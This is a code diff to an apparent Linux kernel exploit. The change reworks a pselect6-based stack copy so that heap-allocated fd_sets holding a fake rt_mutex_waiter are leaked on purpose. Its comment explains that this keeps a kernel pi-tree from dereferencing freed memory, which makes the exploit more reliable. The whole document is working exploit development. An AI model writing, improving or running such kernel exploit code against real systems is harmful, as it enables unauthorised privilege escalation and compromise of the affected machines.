@@ -340,11 +340,26 @@ void slide_pselect_stack_copy(void) {
     return;
   }
 
-  fd_set in;
-  fd_set out;
-  fd_set ex;
-  prepare_slide_pselect_fdsets(&in, &out, &ex);
-  open_slide_selected_fds(&in, &out, &ex, high_read);
+  /* INTENTIONAL LEAK: heap-allocate the pselect6 fd_sets and never free them.
+     kernel rt_mutex pi-tree caches rb_node pointers into these buffers (they
+     embed the fake rt_mutex_waiter). A stack buffer gets destroyed at return;
+     the pi-tree walker then dereferences dangling rb_parent 0x18 (=
+     FAKE_WAITER_OBJ_DIST) and DABT. Leaking keeps buffer alive until cleanup. */
+  fd_set *in = malloc(sizeof(fd_set));
+  fd_set *out = malloc(sizeof(fd_set));
+  fd_set *ex = malloc(sizeof(fd_set));
+  if (!in || !out || !ex) {
+    free(in);
+    free(out);
+    free(ex);
+    close(high_read);
+    if (block_fd != pipefd[0]) { close(block_fd); }
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+  prepare_slide_pselect_fdsets(in, out, ex);
+  open_slide_selected_fds(in, out, ex, high_read);
 
   atomic_store(&slide_consume_stop, 0);
   atomic_store(&slide_consume_go, 0);
@@ -381,7 +396,7 @@ void slide_pselect_stack_copy(void) {
   atomic_store(&slide_consume_go, 1);
   errno = 0;
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
-                         &in, &out, &ex, timeoutp, NULL);
+                         in, out, ex, timeoutp, NULL);
   int saved_errno = errno;
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
